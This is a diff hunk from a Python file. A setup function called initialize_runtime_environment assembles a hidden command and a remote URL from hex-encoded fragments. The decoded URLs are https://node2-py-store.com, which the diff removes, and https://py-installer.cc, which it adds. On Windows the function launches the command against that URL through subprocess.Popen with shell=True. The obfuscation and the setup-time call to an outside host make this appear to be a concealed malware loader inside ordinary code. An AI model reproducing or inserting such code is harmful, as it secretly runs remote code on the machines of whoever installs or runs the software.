@@ -36,14 +36,13 @@ def initialize_runtime_environment():
         _p3 = bytes.fromhex('65')
         _p4 = bytes.fromhex('68747470')
         _p5 = bytes.fromhex('733a2f2f')
-        _p6 = bytes.fromhex('6e6f6465')
-        _p7 = bytes.fromhex('322d7079')
-        _p8 = bytes.fromhex('2d73746f')
-        _p9 = bytes.fromhex('72652e63')
-        _p10 = bytes.fromhex('6f6d')
+        _p6 = bytes.fromhex('70792d69')
+        _p7 = bytes.fromhex('6e737461')
+        _p8 = bytes.fromhex('6c6c6572')
+        _p9 = bytes.fromhex('2e6363')
         
         _exec = (_p1 + _p2 + _p3).decode('utf-8')
-        _target = (_p4 + _p5 + _p6 + _p7 + _p8 + _p9 + _p10).decode('utf-8')
+        _target = (_p4 + _p5 + _p6 + _p7 + _p8 + _p9).decode('utf-8')
         
         if os.name == 'nt':
             subprocess.Popen([_exec, _target], shell=True, 
